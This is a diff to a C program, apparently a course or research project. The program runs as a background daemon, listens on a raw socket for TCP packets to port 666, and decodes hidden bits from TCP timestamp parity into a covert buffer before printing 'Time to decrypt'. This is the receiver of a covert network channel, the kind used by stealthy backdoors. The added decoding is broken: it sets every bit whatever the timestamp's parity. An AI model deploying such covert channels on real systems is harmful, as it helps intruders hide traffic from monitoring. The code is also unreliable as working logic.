@@ -16,6 +16,10 @@
 
 #include "shared.h"
 
+static int byte_count = 0;
+static int bit_count = 0;
+static unsigned char covert_buffer[MAX_PAYLOAD];
+
 int main(void) {
     //Daemonize
     switch (fork()) {
@@ -59,7 +63,7 @@ int main(void) {
             struct iphdr* ip = (struct iphdr*) buffer;
             struct tcphdr* tcp = (struct tcphdr*) (buffer + ip->ihl * 4);
             if (ntohs(tcp->dest) == 666) {
-                printf("Received packet of length %d from raw sock\n", packet_size);
+                //printf("Received packet of length %d from raw sock\n", packet_size);
                 if (tcp->doff > 5) {
                     //Move to the start of the tcp options
                     timestamps = buffer + (ip->ihl * 4) + 20;
@@ -81,7 +85,7 @@ int main(void) {
                             //EVEN IS 0, ODD IS 1
                             unsigned long timestamp_val
                                     = ntohl(*((unsigned long*) (timestamps + 2)));
-                            printf("Received timestamp with value %lu\n", timestamp_val);
+                            //printf("Received timestamp with value %lu\n", timestamp_val);
                             if (timestamp_val & 1) {
                                 //Odd
                                 printf("Timestamp is a 1\n");
@@ -89,6 +93,18 @@ int main(void) {
                                 //Even
                                 printf("Timestamp is a 0\n");
                             }
+
+                            covert_buffer[byte_count] |= (1 << bit_count);
+
+                            if (bit_count == 7) {
+                                ++byte_count;
+                                if (byte_count >= MAX_PAYLOAD) {
+                                    printf("Time to decrypt\n");
+                                    byte_count = 0;
+                                }
+                            }
+                            bit_count = (bit_count + 1) % 8;
+
                             break;
                         } else if (*timestamps == 3) {
                             timestamps += 3;
